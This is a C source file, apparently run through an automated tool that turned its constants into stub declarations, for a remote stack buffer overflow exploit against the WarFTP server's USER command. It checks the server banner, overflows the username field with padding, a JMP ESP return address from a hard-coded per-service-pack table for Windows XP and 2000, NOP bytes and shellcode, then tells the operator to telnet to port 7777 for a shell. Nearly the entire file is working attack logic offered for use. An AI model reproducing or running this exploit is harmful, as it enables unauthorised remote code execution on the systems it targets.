#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */
typedef  struct TYPE_2__   TYPE_1__ ;

/* Type definitions */
struct TYPE_2__ {int /*<<< orphan*/  s_addr; } ;
struct sockaddr_in {int /*<<< orphan*/  sin_zero; int /*<<< orphan*/  sin_port; TYPE_1__ sin_addr; int /*<<< orphan*/  sin_family; } ;
struct sockaddr {int dummy; } ;
typedef  int /*<<< orphan*/  WSADATA ;

/* Variables and functions */
 int /*<<< orphan*/  AF_INET ; 
 int BUFFREAD ; 
 int LENJMPESP ; 
 int /*<<< orphan*/  MAKEWORD (int,int /*<<< orphan*/ ) ; 
 char NOP ; 
 int PORT ; 
 int /*<<< orphan*/  SOCK_STREAM ; 
 int VULNBUFF ; 
 char* VULNCMD ; 
 int /*<<< orphan*/  VULNSERVER ; 
 int /*<<< orphan*/  WSACleanup () ; 
 scalar_t__ WSAStartup (int /*<<< orphan*/ ,int /*<<< orphan*/ *) ; 
 char ZERO ; 
 int atoi (char*) ; 
 int /*<<< orphan*/  closesocket (int) ; 
 int connect (int,struct sockaddr*,int) ; 
 int /*<<< orphan*/  fprintf (int /*<<< orphan*/ ,char*,...) ; 
 int /*<<< orphan*/  free (char*) ; 
 int /*<<< orphan*/  htons (int) ; 
 int /*<<< orphan*/  inet_addr (char*) ; 
 scalar_t__ malloc (int) ; 
 int /*<<< orphan*/  memcpy (char*,char*,int) ; 
 int /*<<< orphan*/  memset (int /*<<< orphan*/ *,int /*<<< orphan*/ ,int) ; 
 int /*<<< orphan*/  recv (int,char*,int,int /*<<< orphan*/ ) ; 
 unsigned int send (int,char*,unsigned int,int /*<<< orphan*/ ) ; 
 int socket (int /*<<< orphan*/ ,int /*<<< orphan*/ ,int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  stderr ; 
 int /*<<< orphan*/  stdout ; 
 int strlen (char*) ; 
 int /*<<< orphan*/  strncmp (char*,char*,int) ; 
 int /*<<< orphan*/ * strstr (char*,int /*<<< orphan*/ ) ; 
 char* syscode ; 
 int /*<<< orphan*/  system (char*) ; 

int main(int argc, char ** argv) {
   char buffRead[BUFFREAD], jmpESP[LENJMPESP], ch, ch2;
   char * pbuffSend;
   unsigned int err = 0, i, k;
   int sockData, j;
   struct sockaddr_in their_addr;
   WSADATA wsaData;

   system("cls");
   fprintf(stdout, "\n\tWarFTP Username Stack-Based Buffer-Overflow Vulnerability\n");
   fprintf(stdout, "     ____________________________________________________________________\n\n");
      
   if (((argc == 3) && (atoi(argv[2]) >= 0) && (atoi(argv[2]) < 14)) || ((argc == 4) && (atoi(argv[2]) == 14))) {
   
      if (WSAStartup(MAKEWORD(2, 0), &wsaData) == 0) {
         if ((sockData = socket(AF_INET, SOCK_STREAM, 0)) != -1) {
                       
                                            /* Server data struct */

            their_addr.sin_family = AF_INET;                      // ; Family AF_INET
            their_addr.sin_addr.s_addr = inet_addr(argv[1]);      // ; IP Address = Argv[1]
            their_addr.sin_port = htons(PORT);                    // ; Port = 21
            memset(&(their_addr.sin_zero), '0', 8);               // ; IP:Port = Argv[1]:21
      
            if (connect(sockData, (struct sockaddr *) &their_addr, sizeof(struct sockaddr)) != -1) {
               recv(sockData, buffRead, BUFFREAD, 0);
               buffRead[BUFFREAD - 1] = ZERO;
               
               if (strstr(buffRead, VULNSERVER) != NULL) {
                                    
                  /* ################################################################################# 
                     ##### BufferSend -> "USER A*VULNBUFF @JMP_ESP \x90\x90\x90\x90 SYSCODE \r\n #####
                     ################################################################################# */
                     
                  pbuffSend = (char *) malloc(strlen(VULNCMD) + VULNBUFF + LENJMPESP + (sizeof(char) * 4) + strlen(syscode) + (sizeof(char) * 2));                                      
                  if (pbuffSend != NULL) {
                     for (i=0; i < strlen(VULNCMD); i++) *(pbuffSend + i) = VULNCMD[i];
                     for (j=0; j < VULNBUFF; i++, j++) *(pbuffSend + i) = '\x41';
                      
                     /*                      - OPcodes from ntdll.dll -> JMP ESP -                     */
                     switch(atoi(argv[2])) {
                        case 0: memcpy(jmpESP, "\xE3\x39\xF4\x77", LENJMPESP); break;
                        case 1: memcpy(jmpESP, "\x0F\x98\xF8\x77", LENJMPESP); break;
                        case 2: memcpy(jmpESP, "\xED\x1E\x95\x7C", LENJMPESP); break;
                        case 3: memcpy(jmpESP, "\xE3\x39\xF4\x77", LENJMPESP); break;
                        case 4: memcpy(jmpESP, "\xCC\x59\xFA\x77", LENJMPESP); break;
                        case 5: memcpy(jmpESP, "\xED\x1E\x95\x7C", LENJMPESP); break;
                        case 6: memcpy(jmpESP, "\xFF\xFF\xFF\xFF", LENJMPESP); break;
                        case 7: memcpy(jmpESP, "\xFF\xFF\xFF\xFF", LENJMPESP); break;
                        case 8: memcpy(jmpESP, "\xFF\xFF\xFF\xFF", LENJMPESP); break;
                        case 9: memcpy(jmpESP, "\xFF\xFF\xFF\xFF", LENJMPESP); break;
                        case 10: memcpy(jmpESP, "\x8B\x94\xF8\x77", LENJMPESP); break;
                        case 11: memcpy(jmpESP, "\xAB\x67\xF9\x77", LENJMPESP); break;
                        case 12: memcpy(jmpESP, "\xFF\xFF\xFF\xFF", LENJMPESP); break;
                        case 13: memcpy(jmpESP, "\xFF\xFF\xFF\xFF", LENJMPESP); break;
                        case 14: 
                           k = 0;
                           if ((strncmp(argv[3], "0x", (sizeof(char) * 2)) == 0) && (strlen(argv[3]) == 10)) {
                              for (j=(sizeof(char) * 8) - 1; ((j >= 0) && (!err)); j--) {
                                 ch = *(argv[3] + j + 2);
                                 if (((ch > 47) && (ch < 58)) || ((ch > 64) && (ch < 71)) || ((ch > 96) && (ch < 103))) {
                                    if ((ch > 47) && (ch < 58)) ch -= 48;
                                    else if ((ch > 64) && (ch < 71)) ch -= 55;
                                    else ch -= 87;
                                    
                                    if ((j % 2) == 0) jmpESP[k++] = ((ch <<= 4) | ch2);
                                    else ch2 = ch;
                                 }
                                 else { fprintf(stderr, "\t[ ERROR ] Three parameter syntax error\n\t[ ERROR ] Example: 0xFFFFFFFF\n"); err = 1; }  
                              }             
                           }
                           else { fprintf(stderr, "\t[ ERROR ] Three parameter syntax error\n\t[ ERROR ] Example: 0xFFFFFFFF\n"); err = 1; }
                     }
                     
                     if (!err) {
                        for (j=0; j < LENJMPESP; i++, j++) *(pbuffSend + i) = jmpESP[j];
                        for (j=0; j < (sizeof(char) * 4); i++, j++) *(pbuffSend + i) = NOP;
                        for (j=0; j < strlen(syscode); i++, j++) *(pbuffSend + i) = syscode[j];
                        memcpy(pbuffSend + i, "\r\n", (sizeof(char) * 2));
                     
                        if (i == send(sockData, pbuffSend, ++i, 0)) {
                          fprintf(stdout, "\t[ OK ] Exploit buffer send to %s:%d\n", argv[1], PORT);
                          fprintf(stdout, "\t[ OK ] If you have not chosen a correct operating system and\n\t       service pack you can cause a D.O.S\n");
                          fprintf(stdout, "\t[ OK ] Connect: telnet %s 7777\n", argv[1]);
                        } 
                        else fprintf(stderr, "\t[ ERROR ] No sending all exploit buffer\n");
                     }
                     free(pbuffSend);
                  }
                  else fprintf(stderr, "\t[ ERROR ] No allocate memory\n");
               }
               else fprintf(stderr, "\t[ ERROR ] Not a vulnerable server\n");
            }
            else fprintf(stderr, "\t[ ERROR ] Connect to %s:%d\n", argv[1], PORT);
            closesocket(sockData);
         }
         else fprintf(stderr, "\t[ ERROR ] Create local socket\n");
         WSACleanup();
      }
      else fprintf(stderr, "\t[ ERROR ] Load library");
   }
   else {
      fprintf(stderr, "   [ + ] USE: %s IP_ADDRESS SERVICE_PACK [ ESP_ADDRESS ]\n\n", argv[0]);
      fprintf(stderr, "   [ + ] SERVICE PACK:  [ - ] Microsoft Windows XP Pro Spanish SP0 (0)\n");
      fprintf(stderr, "\t\t\t[ - ] Microsoft Windows XP Pro Spanish SP1 (1)\n");
      fprintf(stderr, "\t\t\t[ - ] Microsoft Windows XP Pro Spanish SP2 (2)\n");
      fprintf(stderr, "\t\t\t[ - ] Microsoft Windows XP Pro English SP0 (3)\n");
      fprintf(stderr, "\t\t\t[ - ] Microsoft Windows XP Pro English SP1 (4)\n");
      fprintf(stderr, "\t\t\t[ - ] Microsoft Windows XP Pro English SP2 (5)\n");
      fprintf(stderr, "\t\t\t[ - ] Microsoft Windows 2000 Pro Spanish SP0 (6)\n");
      fprintf(stderr, "\t\t\t[ - ] Microsoft Windows 2000 Pro Spanish SP1 (7)\n");
      fprintf(stderr, "\t\t\t[ - ] Microsoft Windows 2000 Pro Spanish SP2 (8)\n");
      fprintf(stderr, "\t\t\t[ - ] Microsoft Windows 2000 Pro Spanish SP3 (9)\n");
      fprintf(stderr, "\t\t\t[ - ] Microsoft Windows 2000 Pro English SP0 (10)\n");
      fprintf(stderr, "\t\t\t[ - ] Microsoft Windows 2000 Pro English SP1 (11)\n");
      fprintf(stderr, "\t\t\t[ - ] Microsoft Windows 2000 Pro English SP2 (12)\n");
      fprintf(stderr, "\t\t\t[ - ] Microsoft Windows 2000 Pro English SP3 (13)\n");
      fprintf(stderr, "\t\t\t[ - ] Custom Service Pack - JMP %%ESP (14)\n\n");
      fprintf(stderr, "   [ + ] EXAMPLE:  %s 127.0.0.1 2\n", argv[0]);
      fprintf(stderr, "   [ + ] EXAMPLE2: %s 127.0.0.1 14 0x776EDDFF\n", argv[0]);
   }
   fprintf(stdout, "     ___________________________________________________________________\n\n");
   return 0;
}